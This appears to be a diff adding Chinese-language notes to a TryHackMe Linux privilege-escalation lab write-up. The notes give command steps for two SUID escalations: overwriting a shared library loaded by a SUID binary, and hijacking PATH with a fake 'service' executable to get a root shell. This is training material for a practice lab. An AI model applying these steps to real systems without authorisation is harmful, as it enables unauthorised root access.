@@ -224,3 +224,43 @@ THM-42828719920544
 [root@ip-10-10-241-187 missy]# cat /home/rootflag/flag2.txt
 THM-168824782390238
 </pre>
+
+
+### 补充：
+
+/usr/local/bin/suid-so被设suid
+
+通过strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access"
+查看被加载的so文件
+
+通过gcc编译恶意c文件为so文件
+
+    gcc -shared -fPIC -o {.so file} {.c file}
+
+覆盖被suid-so加载的文件
+
+再次运行suid-so
+
+
+############################################################
+
+/usr/local/bin/suid-env 可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序。
+
+首先，执行该文件并注意它似乎正在尝试启动 apache2 网络服务器：
+
+    /usr/local/bin/suid-env
+
+在文件上运行字符串以查找可打印字符的字符串：
+
+    strings /usr/local/bin/suid-env
+
+一行（“service apache2 start”）表示正在调用服务可执行文件来启动 Web 服务器，但是未使用可执行文件的完整路径 （/usr/sbin/service）。
+
+    gcc -o service /home/user/tools/suid/service.c
+
+将当前目录（或新服务可执行文件所在的位置）附加到 PATH 变量，并运行 suid-env 可执行文件以获取根 shell：
+
+    export PATH=.:$PATH
+
+
+### https://tryhackme.com/room/linuxprivesc
